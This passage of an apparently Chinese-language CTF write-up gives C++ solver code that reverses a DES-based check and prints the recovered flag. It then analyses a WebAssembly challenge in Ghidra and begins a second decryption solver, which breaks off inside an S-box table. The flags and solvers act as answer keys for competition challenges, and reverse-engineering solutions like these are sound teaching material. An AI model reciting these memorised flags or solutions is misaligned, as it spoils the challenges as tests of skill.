class="number">0x0002</span>, <span class="number">0x0001</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF65FC70910[<span class="number">24</span>] = &#123;</span><br><span class="line">    <span class="number">0x00800000</span>, <span class="number">0x00400000</span>, <span class="number">0x00200000</span>, <span class="number">0x00100000</span>, <span class="number">0x00080000</span>, <span class="number">0x00040000</span>, <span class="number">0x00020000</span>, <span class="number">0x00010000</span>,</span><br><span class="line">    <span class="number">0x00008000</span>, <span class="number">0x00004000</span>, <span class="number">0x00002000</span>, <span class="number">0x00001000</span>, <span class="number">0x00000800</span>, <span class="number">0x00000400</span>, <span class="number">0x00000200</span>, <span class="number">0x00000100</span>,</span><br><span class="line">    <span class="number">0x00000080</span>, <span class="number">0x00000040</span>, <span class="number">0x00000020</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF65FC70970[<span class="number">56</span>] = &#123;</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x30</span>, <span class="number">0x28</span>, <span class="number">0x20</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x31</span>, <span class="number">0x29</span>, <span class="number">0x21</span>, <span class="number">0x19</span>, <span class="number">0x11</span>, <span class="number">0x09</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x32</span>, <span class="number">0x2A</span>, <span class="number">0x22</span>, <span class="number">0x1A</span>, <span class="number">0x12</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x3B</span>, <span class="number">0x33</span>, <span class="number">0x2B</span>, <span class="number">0x23</span>, <span class="number">0x3E</span>, <span class="number">0x36</span>, <span class="number">0x2E</span>, <span class="number">0x26</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x16</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x3D</span>, <span class="number">0x35</span>, <span class="number">0x2D</span>, <span class="number">0x25</span>, <span class="number">0x1D</span>, <span class="number">0x15</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x2C</span>, <span class="number">0x24</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF65FC709A8[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">des_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *_a1_, DWORD *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> left = _a1_[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> right = _a1_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> temp = (left ^ (right &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xF0F0F0F</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">4</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">0x0000FFFF</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">16</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (temp &lt;&lt; <span class="number">2</span>) ^ left;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0x00FF00FF</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (((temp &lt;&lt; <span class="number">8</span>) ^ left) &gt;&gt; <span class="number">31</span>) | (<span class="number">2</span> * ((temp &lt;&lt; <span class="number">8</span>) ^ left));</span><br><span class="line"></span><br><span class="line">    temp = (left ^ right) &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = ((temp ^ right) &gt;&gt; <span class="number">31</span>) | (<span class="number">2</span> * (temp ^ right));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = *_a2_++ ^ ((left &gt;&gt; <span class="number">4</span>) | (left &lt;&lt; <span class="number">28</span>));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> result1 = s1[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s3[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s5[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                               s7[temp &amp; <span class="number">0x3F</span>];</span><br><span class="line">        temp = *_a2_++ ^ left;</span><br><span class="line"></span><br><span class="line">        right ^= s2[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s4[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s6[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 s8[temp &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                 result1;</span><br><span class="line"></span><br><span class="line">        temp = *_a2_++ ^ ((right &gt;&gt; <span class="number">4</span>) | (right &lt;&lt; <span class="number">28</span>));</span><br><span class="line">        result1 = s1[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s3[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s5[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                  s7[temp &amp; <span class="number">0x3F</span>];</span><br><span class="line"></span><br><span class="line">        temp = *_a2_++ ^ right;</span><br><span class="line">        left ^= s2[(temp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s4[(temp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s6[(temp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                s8[temp &amp; <span class="number">0x3F</span>] |</span><br><span class="line">                result1;</span><br><span class="line">    &#125;</span><br><span class="line">    left = (left &gt;&gt; <span class="number">1</span>) | (left &lt;&lt; <span class="number">31</span>);</span><br><span class="line">    temp = (left ^ right) &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = ((temp ^ right) &gt;&gt; <span class="number">1</span>) | ((temp ^ right) &lt;&lt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFF00FF</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">8</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (left ^ (right &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    left = temp ^ left;</span><br><span class="line">    right = (temp &lt;&lt; <span class="number">2</span>) ^ right;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    right = temp ^ right;</span><br><span class="line">    left = (temp &lt;&lt; <span class="number">16</span>) ^ left;</span><br><span class="line"></span><br><span class="line">    temp = (right ^ (left &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0x0F0F0F0F</span>;</span><br><span class="line"></span><br><span class="line">    _a1_[<span class="number">0</span>] = (temp &lt;&lt; <span class="number">4</span>) ^ left;</span><br><span class="line">    _a1_[<span class="number">1</span>] = temp ^ right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">64</span>] = &#123;</span><br><span class="line">        <span class="number">0x2C0B3C36</span>, <span class="number">0x09221A0A</span>, <span class="number">0x2829051D</span>, <span class="number">0x09123B0D</span>, <span class="number">0x2C091B18</span>, <span class="number">0x0512011F</span>, <span class="number">0x09292E17</span>, <span class="number">0x07122920</span>,</span><br><span class="line">        <span class="number">0x090D1703</span>, <span class="number">0x0514372E</span>, <span class="number">0x0915123C</span>, <span class="number">0x27100E27</span>, <span class="number">0x01050927</span>, <span class="number">0x25150D29</span>, <span class="number">0x13151F32</span>, <span class="number">0x24112618</span>,</span><br><span class="line">        <span class="number">0x03052031</span>, <span class="number">0x34312B37</span>, <span class="number">0x13043A05</span>, <span class="number">0x3C19151B</span>, <span class="number">0x23063B3E</span>, <span class="number">0x34293830</span>, <span class="number">0x03062108</span>, <span class="number">0x380B3F2A</span>,</span><br><span class="line">        <span class="number">0x260E063D</span>, <span class="number">0x3009141B</span>, <span class="number">0x0E223D3D</span>, <span class="number">0x300B0124</span>, <span class="number">0x062A1700</span>, <span class="number">0x11093D14</span>, <span class="number">0x0E22262B</span>, <span class="number">0x1208083E</span>,</span><br><span class="line">        <span class="number">0x0E22262B</span>, <span class="number">0x1208083E</span>, <span class="number">0x062A1700</span>, <span class="number">0x11093D14</span>, <span class="number">0x0E223D3D</span>, <span class="number">0x300B0124</span>, <span class="number">0x260E063D</span>, <span class="number">0x3009141B</span>,</span><br><span class="line">        <span class="number">0x03062108</span>, <span class="number">0x380B3F2A</span>, <span class="number">0x23063B3E</span>, <span class="number">0x34293830</span>, <span class="number">0x13043A05</span>, <span class="number">0x3C19151B</span>, <span class="number">0x03052031</span>, <span class="number">0x34312B37</span>,</span><br><span class="line">        <span class="number">0x13151F32</span>, <span class="number">0x24112618</span>, <span class="number">0x01050927</span>, <span class="number">0x25150D29</span>, <span class="number">0x0915123C</span>, <span class="number">0x27100E27</span>, <span class="number">0x090D1703</span>, <span class="number">0x0514372E</span>,</span><br><span class="line">        <span class="number">0x09292E17</span>, <span class="number">0x07122920</span>, <span class="number">0x2C091B18</span>, <span class="number">0x0512011F</span>, <span class="number">0x2829051D</span>, <span class="number">0x09123B0D</span>, <span class="number">0x2C0B3C36</span>, <span class="number">0x09221A0A</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> data[<span class="number">64</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000084</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000003</span>, <span class="number">0x00000022</span>, <span class="number">0x00000014</span>, <span class="number">0x000000BE</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000075</span>,</span><br><span class="line">        <span class="number">0x000000B3</span>, <span class="number">0x000000D5</span>, <span class="number">0x00000076</span>, <span class="number">0x0000006F</span>, <span class="number">0x000000CD</span>, <span class="number">0x0000002A</span>, <span class="number">0x0000005D</span>, <span class="number">0x000000D7</span>,</span><br><span class="line">        <span class="number">0x0000004D</span>, <span class="number">0x000000B2</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000098</span>, <span class="number">0x0000009D</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000A8</span>,</span><br><span class="line">        <span class="number">0x000000F7</span>, <span class="number">0x00000023</span>, <span class="number">0x000000F2</span>, <span class="number">0x0000008B</span>, <span class="number">0x000000F2</span>, <span class="number">0x00000054</span>, <span class="number">0x00000065</span>, <span class="number">0x0000007A</span>,</span><br><span class="line">        <span class="number">0x00000020</span>, <span class="number">0x000000C0</span>, <span class="number">0x00000087</span>, <span class="number">0x00000055</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000046</span>, <span class="number">0x0000003D</span>,</span><br><span class="line">        <span class="number">0x000000F7</span>, <span class="number">0x000000B2</span>, <span class="number">0x0000007A</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000C2</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000AE</span>,</span><br><span class="line">        <span class="number">0x00000016</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000015</span>, <span class="number">0x00000030</span>, <span class="number">0x0000008E</span>, <span class="number">0x000000FD</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000009E</span>,</span><br><span class="line">        <span class="number">0x000000AA</span>, <span class="number">0x00000039</span>, <span class="number">0x000000AB</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000095</span>, <span class="number">0x000000A7</span>, <span class="number">0x0000001F</span>, <span class="number">0x000000F1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Enc[<span class="number">64</span>]&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">        Enc[i] = data[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四字节一组翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> a = Enc[i], b = Enc[i + <span class="number">1</span>], c = Enc[i + <span class="number">2</span>], d = Enc[i + <span class="number">3</span>];</span><br><span class="line">        Enc[i] = d;</span><br><span class="line">        Enc[i + <span class="number">1</span>] = c;</span><br><span class="line">        Enc[i + <span class="number">2</span>] = b;</span><br><span class="line">        Enc[i + <span class="number">3</span>] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// DES解密（用后32个key）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">des_encrypt</span>((<span class="type">unsigned</span> <span class="type">int</span> *)(Enc + i), (DWORD *)(key + <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四字节一组翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> a = Enc[i], b = Enc[i + <span class="number">1</span>], c = Enc[i + <span class="number">2</span>], d = Enc[i + <span class="number">3</span>];</span><br><span class="line">        Enc[i] = d;</span><br><span class="line">        Enc[i + <span class="number">1</span>] = c;</span><br><span class="line">        Enc[i + <span class="number">2</span>] = b;</span><br><span class="line">        Enc[i + <span class="number">3</span>] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HZNUCTF&#123;&quot;</span>);</span><br><span class="line">    <span class="comment">// 逆向初始字符串变换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string tmp1;</span><br><span class="line">        tmp1 += Enc[i];</span><br><span class="line">        tmp1 += Enc[i + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        std::string tmp2;</span><br><span class="line">        tmp2 += Enc[i + <span class="number">1</span>];</span><br><span class="line">        tmp2 += Enc[i + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">char</span>(std::<span class="built_in">stoi</span>(tmp1, <span class="number">0</span>, <span class="number">16</span>)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">char</span>(std::<span class="built_in">stoi</span>(tmp2, <span class="number">0</span>, <span class="number">16</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</p><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p>下载附件发现 wasm 文件开头字节和正常 wasm 文件不一样，复制修复即可。</p><p>左题目附件，右正常 wasm 文件。</p><p><img src="/2025/04/13/TGCTF2025/M9ZPbLMbioV3hrxarPMciS0dnbf.png"></p><p>使用 ghidra 进行分析，因为有专门的 wasm 反编译插件。</p><p>通过 Exports 定位到 main 函数，以下是经过我重命名后的结果。</p><p><img src="/2025/04/13/TGCTF2025/Mo4zbUXD1okZhqxZWYDcEm0vnId.png"></p><p>首先是输入 key，然后判断和该处明文是否相等。</p><p>然后将 Key xor 上 0x51。</p><p><img src="/2025/04/13/TGCTF2025/F4AZbPGRWodE4xxUffqcALrfnoe.png"></p><p><img src="/2025/04/13/TGCTF2025/Ua4PbQxeMo07WDxysZ8czeFMnff.png"></p><p>第一步加密，置了随机数种子 0x194，然后用随机数打乱输入的字符串，再转存到另一个 Out 数组。</p><p><img src="/2025/04/13/TGCTF2025/Ug0bbgaRVozqItxGyL8c8INnnhh.png"></p><p><img src="/2025/04/13/TGCTF2025/NXLdb6PLdouDr5xaFMDcw4OHnYv.png"></p><p>第二步加密（四个字节一组加密）：</p><ol><li>用 key 获取到两个值，然后全局数值 iRam0001120++，每次加密都 +1，初始值是 0。</li><li>调用一个函数将 0x10ea0 处数据异或上 0x10da0 取下标的对应值。</li><li>再将输入字符串异或上 0x10ea0 对应下标数据以及 0x11020 对应下标数据，0x11020 处数据就是原 Key 字符串**”TGCTF404”**。</li></ol><p><img src="/2025/04/13/TGCTF2025/ZjFubkmQ4ol6FRxwT4ic1yV0nrc.png"></p><p><img src="/2025/04/13/TGCTF2025/Qs5jbvWYtodwoExExOPcMX1CnSg.png"></p><p>最后再与 0x10fa0 处数据进行比对，所以 0x10fa0 处就是加密后的 flag。</p><p><img src="/2025/04/13/TGCTF2025/BisXbEousotrInxxm1DcQ0Yineb.png"></p><p>导出 0x10ea0 和 0x10da0 数据，编写以上代码的逆向解密代码即可。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x10da0处数据</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box[] = &#123;</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>,</span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>,</span><br><span class="line">    <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>,</span><br><span class="line">    <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>,</span><br><span class="line">    <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>,</span><br><span class="line">    <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>,</span><br><span class="line">    <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span 